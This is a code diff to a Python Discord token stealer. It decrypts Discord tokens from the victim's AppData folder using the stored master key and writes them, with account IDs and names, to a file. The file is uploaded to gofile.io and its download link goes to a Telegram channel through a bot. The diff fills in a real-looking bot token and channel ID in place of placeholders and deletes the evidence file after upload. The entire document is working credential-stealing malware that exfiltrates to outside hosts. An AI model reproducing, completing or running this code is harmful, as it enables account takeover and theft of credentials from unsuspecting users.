@@ -7,30 +7,33 @@ import json
 import requests
 import subprocess
 
-BOT_TOKEN = 'YOUR TELEGRAM BOT TOKEN'
-CHANNEL_ID = TELEGRAM CHANNEL ID WHERE THE BOT IS LOCATED
+BOT_TOKEN = '7147454534:AAHa08rDeHun1_JWqqOMu9wPAas1I9_Wpbc'
+CHANNEL_ID = -1002015035900
 
 
 def send_download_link(download_link):
-    url = f'https://api.telegram.org/bot{BOT_TOKEN}/SendMessage?chat_id={CHANNEL_ID}&text=Target: {get_sys_username()}\nDownload Link: {download_link}'
+    url = f'https://api.telegram.org/bot{BOT_TOKEN}/SendMessage?chat_id={CHANNEL_ID}&text=Target: {username}\nDownload Link: {download_link}'
 
     requests.get(url)
 
 
 def upload_file(file):
+
+    os.chdir('C:\\Users\\' + username)
+
     res = subprocess.check_output('curl -s https://api.gofile.io/getServer', shell=True).decode()
 
-    jsdata = json.loads(res)
+    data = json.loads(res)
 
-    server = jsdata['data']
+    server = data['data']
 
     server = server['server']
 
     res = subprocess.check_output(f'curl -s -F file=@{file} https://{server}.gofile.io/uploadFile', shell=True).decode()
 
-    jsdata = json.loads(res)
+    data = json.loads(res)
 
-    download_link = jsdata['data']['downloadPage']
+    download_link = data['data']['downloadPage']
 
     send_download_link(download_link)
 
@@ -51,7 +54,6 @@ def get_masterKey():
     """
      Master Key is a key we use it to make the cipher from it then decrypt the token.
     """
-    username = get_sys_username()
     path = 'c:/Users/' + username + '/AppData/Roaming/discord/Local State'  # the location of master key
     with open(path, 'r') as f:
         data = f.read()
@@ -76,7 +78,6 @@ class Discord:
         """
         Grab All Tokens Then Decrypt Them and Store them Into a List.
         """
-        username = get_sys_username()
         path: str = "c:/Users/" + username + "/AppData/Roaming/discord/Local Storage/leveldb/"  # Here is where the tokens are stored.
         mkey = get_masterKey()
         for file in os.listdir(path):
@@ -108,9 +109,10 @@ class Discord:
 
 
 if __name__ == '__main__':
+    username = get_sys_username()
     discord = Discord()
     decrypted_tokens = discord.get_tokens()
-    not_allowed_chars = ['', '`', '', '|', '', '', "'", '%', '"', '!', ']', '[', '(', ')']
+    not_allowed_chars = ['', '`', '', '|', '', '', "'", '%', '"', '!', ']', '[', '(', ')', '']
     for token in decrypted_tokens:
         for char in not_allowed_chars:
             if char in token:
@@ -133,10 +135,10 @@ if __name__ == '__main__':
                 uid = ''.join(uid_list)[:28]
                 dec_uid = base64.b64decode(uid)[:-2].decode('utf-8')
 
-        os.chdir(str('C:\\Users\\' + get_sys_username()))
-        with open('discordToken.txt', 'a', encoding='utf-8', errors='ignore') as f:
+        os.chdir('C:\\Users\\' + get_sys_username())
+        with open('DiscordTokens.txt', 'a', encoding='utf-8', errors='ignore') as f:
             f.writelines(
                 ['=' * 65, f'\nCode: {token_resp[0]}\nToken: {token}\nDiscord ID: {dec_uid}\nName: {token_resp[1]}\n',
                  '=' * 65 + '\n\n'])
-    upload_file('discordToken.txt')
-    os.remove('discordToken.txt')
+    upload_file('DiscordTokens.txt')
+    os.remove('DiscordTokens.txt')
